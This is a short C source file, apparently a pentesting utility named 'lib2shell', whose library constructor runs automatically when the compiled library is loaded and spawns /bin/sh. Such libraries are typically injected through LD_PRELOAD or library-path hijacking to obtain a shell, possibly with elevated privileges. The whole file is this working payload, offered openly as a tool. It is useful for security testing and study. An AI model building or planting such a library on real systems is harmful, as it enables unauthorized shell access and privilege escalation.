// Author: Sean Pesce

#include <stdio.h>
#include <unistd.h>

#define SHELL "/bin/sh"
 
void __attribute__ ((constructor)) constructor()
{
    puts("[lib2shell by SeanP]");
    printf("Starting %s\n", SHELL);
    long long err = execl(SHELL, "/bin/sh", "-c", SHELL, NULL);
    printf("Result: %lld\n", err);
}
